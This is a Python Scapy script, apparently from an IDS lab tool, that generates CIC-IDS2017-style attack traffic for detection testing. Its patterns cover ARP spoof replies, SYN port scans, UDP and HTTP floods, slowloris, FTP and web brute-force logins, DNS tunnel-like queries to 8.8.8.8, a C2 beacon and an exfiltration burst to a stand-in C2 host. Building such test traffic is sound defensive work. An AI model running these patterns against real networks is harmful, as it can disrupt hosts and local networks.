#!/usr/bin/env python3
"""Generate synthetic CIC-IDS2017-style attack traffic for NIDS/ML lab testing."""

from __future__ import annotations

import argparse
import random
import signal
import sys
import time

_STOP = False


def _handle_stop(_signum, _frame):
    global _STOP
    _STOP = True


def _require_scapy():
    try:
        from scapy.all import (  # noqa: F401
            ARP,
            DNS,
            DNSQR,
            IP,
            Raw,
            TCP,
            UDP,
            Ether,
            send,
            sendp,
        )
        return send, sendp, ARP, IP, TCP, UDP, Ether, DNS, DNSQR, Raw
    except ImportError:
        print("Scapy required: pip install scapy", file=sys.stderr)
        sys.exit(1)


def _until(duration: float) -> bool:
    return not _STOP and time.time() < duration


def pattern_arp(sendp, ARP, Ether, iface: str, duration: float) -> None:
    end = time.time() + duration
    i = 0
    while _until(end):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2, psrc=f"192.168.1.{100 + (i % 50)}", pdst="192.168.1.1"
        )
        sendp(pkt, iface=iface, verbose=0)
        i += 1
        time.sleep(0.25)


def pattern_portscan(send, IP, TCP, duration: float) -> None:
    end = time.time() + duration
    dst = "10.0.0.50"
    port = 1
    while _until(end):
        pkt = IP(dst=dst) / TCP(dport=port, flags="S")
        send(pkt, verbose=0)
        port = (port % 1024) + 1
        time.sleep(0.04)


def pattern_dns(send, IP, UDP, DNS, DNSQR, duration: float) -> None:
    end = time.time() + duration
    while _until(end):
        label = "x" * random.randint(40, 72)
        qname = f"{label}.evil-lab.example.com"
        pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
        send(pkt, verbose=0)
        time.sleep(0.35)


def pattern_bot(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst, dport = "203.0.113.77", 8443
    while _until(end):
        payload = b"beacon-" + str(int(time.time())).encode()
        pkt = IP(dst=dst) / TCP(dport=dport, flags="PA") / Raw(load=payload)
        send(pkt, verbose=0)
        time.sleep(2.0)


def pattern_ddos(send, IP, UDP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "198.51.100.99"
    while _until(end):
        for _ in range(8):
            pkt = IP(dst=dst) / UDP(dport=random.randint(1024, 65535)) / Raw(load=b"X" * 512)
            send(pkt, verbose=0)
        time.sleep(0.02)


def pattern_dos_goldeneye(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.10"
    while _until(end):
        req = (
            b"GET /?goldeneye=1 HTTP/1.1\r\n"
            b"Host: lab-target\r\nConnection: Keep-Alive\r\n"
            b"User-Agent: GoldenEye\r\n\r\n"
        )
        pkt = IP(dst=dst) / TCP(dport=80, flags="PA") / Raw(load=req)
        send(pkt, verbose=0)
        time.sleep(0.08)


def pattern_dos_hulk(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.11"
    while _until(end):
        q = random.randint(10000, 99999)
        req = f"GET /?hulk={q} HTTP/1.1\r\nHost: lab\r\n\r\n".encode()
        pkt = IP(dst=dst) / TCP(dport=80, flags="PA") / Raw(load=req)
        send(pkt, verbose=0)
        time.sleep(0.03)


def pattern_dos_slowhttptest(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.12"
    while _until(end):
        req = b"GET / HTTP/1.1\r\nHost: lab\r\n"
        pkt = IP(dst=dst) / TCP(dport=80, flags="PA") / Raw(load=req)
        send(pkt, verbose=0)
        time.sleep(1.2)


def pattern_dos_slowloris(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.13"
    headers = [
        b"GET / HTTP/1.1\r\n",
        b"Host: lab\r\n",
        b"User-Agent: slowloris\r\n",
        b"X-a: ",
    ]
    i = 0
    while _until(end):
        chunk = headers[i % len(headers)]
        if i >= 2:
            chunk = b"X-" + str(i).encode() + b": a\r\n"
        pkt = IP(dst=dst) / TCP(dport=80, flags="PA") / Raw(load=chunk)
        send(pkt, verbose=0)
        i += 1
        time.sleep(0.9)


def pattern_ftp_patator(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.21"
    users = (b"USER admin\r\n", b"USER root\r\n", b"PASS wrong\r\n", b"PASS 123456\r\n")
    idx = 0
    while _until(end):
        pkt = IP(dst=dst) / TCP(dport=21, flags="PA") / Raw(load=users[idx % len(users)])
        send(pkt, verbose=0)
        idx += 1
        time.sleep(0.15)


def pattern_ssh_patator(send, IP, TCP, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.22"
    while _until(end):
        pkt = IP(dst=dst) / TCP(dport=22, flags="S")
        send(pkt, verbose=0)
        time.sleep(0.06)


def pattern_web_brute(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    dst = "203.0.113.23"
    creds = ("admin", "password", "root", "123456", "letmein")
    i = 0
    while _until(end):
        user, pwd = creds[i % len(creds)], creds[(i + 1) % len(creds)]
        body = f"user={user}&pass={pwd}".encode()
        req = (
            b"POST /login HTTP/1.1\r\nHost: lab\r\nContent-Length: "
            + str(len(body)).encode()
            + b"\r\n\r\n"
            + body
        )
        pkt = IP(dst=dst) / TCP(dport=80, flags="PA") / Raw(load=req)
        send(pkt, verbose=0)
        i += 1
        time.sleep(0.12)


def pattern_infiltration(send, IP, TCP, Raw, duration: float) -> None:
    end = time.time() + duration
    c2 = "203.0.113.99"
    while _until(end):
        exfil = b"EXFIL-" + bytes(random.getrandbits(8) for _ in range(900))
        pkt = IP(dst=c2) / TCP(dport=4444, flags="PA") / Raw(load=exfil)
        send(pkt, verbose=0)
        time.sleep(1.5)


PATTERNS = {
    "arp": ("ARP spoof-like bursts", pattern_arp, ("sendp", "ARP", "Ether", "iface")),
    "portscan": ("PortScan SYN sweep", pattern_portscan, ("send", "IP", "TCP")),
    "scan": ("PortScan (alias)", pattern_portscan, ("send", "IP", "TCP")),
    "dns": ("DNS tunnel-like queries", pattern_dns, ("send", "IP", "UDP", "DNS", "DNSQR")),
    "bot": ("Bot C2 beacon", pattern_bot, ("send", "IP", "TCP", "Raw")),
    "beacon": ("Bot beacon (alias)", pattern_bot, ("send", "IP", "TCP", "Raw")),
    "ddos": ("DDoS UDP flood", pattern_ddos, ("send", "IP", "UDP", "Raw")),
    "dos_goldeneye": ("DoS GoldenEye HTTP", pattern_dos_goldeneye, ("send", "IP", "TCP", "Raw")),
    "dos_hulk": ("DoS Hulk HTTP flood", pattern_dos_hulk, ("send", "IP", "TCP", "Raw")),
    "dos_slowhttptest": ("DoS SlowHTTPTest", pattern_dos_slowhttptest, ("send", "IP", "TCP", "Raw")),
    "dos_slowloris": ("DoS slowloris", pattern_dos_slowloris, ("send", "IP", "TCP", "Raw")),
    "ftp_patator": ("FTP-Patator logins", pattern_ftp_patator, ("send", "IP", "TCP", "Raw")),
    "ssh_patator": ("SSH-Patator SYN flood", pattern_ssh_patator, ("send", "IP", "TCP")),
    "web_brute": ("Web Attack brute force", pattern_web_brute, ("send", "IP", "TCP", "Raw")),
    "infiltration": ("Infiltration exfil burst", pattern_infiltration, ("send", "IP", "TCP", "Raw")),
}

DEFAULT_ATTACKS = [
    "portscan", "bot", "ddos", "dos_goldeneye", "dos_hulk",
    "dos_slowhttptest", "dos_slowloris", "ftp_patator", "ssh_patator",
    "web_brute", "dns", "infiltration", "arp",
]

try:
    from app.services.lab.patterns import ALL_LAB_PATTERNS as DEFAULT_ATTACKS  # noqa: F811
except ImportError:
    pass


def _emit_status(pattern: str, **extra) -> None:
    import json as _json
    payload = {"pattern": pattern, "started_at": time.time(), **extra}
    print(f"STATUS: {_json.dumps(payload)}", flush=True)


def _run_one(name: str, ctx: dict, slice_dur: float) -> None:
    entry = PATTERNS.get(name)
    if not entry:
        print(f"Unknown pattern: {name}", file=sys.stderr)
        return
    label, fn, arg_names = entry
    _emit_status(name, label=label, duration_sec=slice_dur)
    print(f"[{name}] {label} (~{slice_dur:.0f}s)", flush=True)
    args = [ctx[n] for n in arg_names]
    args.append(slice_dur)
    try:
        fn(*args)
    except Exception as exc:
        print(f"STATUS: {{\"pattern\": \"{name}\", \"error\": \"{exc}\"}}", flush=True)
        raise


def main() -> int:
    parser = argparse.ArgumentParser(description="CIC-IDS2017-style lab traffic for Suricata/ML/tcpdump")
    parser.add_argument("--interface", "-i", default="eth0")
    parser.add_argument("--duration", type=int, default=30, help="Total seconds (ignored with --forever)")
    parser.add_argument("--forever", action="store_true", help="Rotate patterns until SIGTERM")
    parser.add_argument("--rotate-sec", type=int, default=8, help="Seconds per pattern in --forever mode")
    parser.add_argument(
        "--pattern",
        default="all",
        help="all|comma-separated: " + ",".join(DEFAULT_ATTACKS),
    )
    args = parser.parse_args()

    signal.signal(signal.SIGTERM, _handle_stop)
    signal.signal(signal.SIGINT, _handle_stop)

    send, sendp, ARP, IP, TCP, UDP, Ether, DNS, DNSQR, Raw = _require_scapy()
    ctx = {
        "send": send,
        "sendp": sendp,
        "ARP": ARP,
        "IP": IP,
        "TCP": TCP,
        "UDP": UDP,
        "Ether": Ether,
        "DNS": DNS,
        "DNSQR": DNSQR,
        "Raw": Raw,
        "iface": args.interface,
    }

    if args.pattern == "all":
        names = list(DEFAULT_ATTACKS)
    else:
        names = [p.strip() for p in args.pattern.split(",") if p.strip()]

    print(
        f"packetEye lab: iface={args.interface} patterns={names} "
        f"forever={args.forever} rotate={args.rotate_sec}s",
        flush=True,
    )

    if args.forever:
        idx = 0
        while not _STOP:
            name = names[idx % len(names)]
            _run_one(name, ctx, float(args.rotate_sec))
            idx += 1
        print("Stopped.", flush=True)
        return 0

    slice_dur = max(5, args.duration // max(len(names), 1))
    for name in names:
        if _STOP:
            break
        _run_one(name, ctx, float(slice_dur))
    print("Done.", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
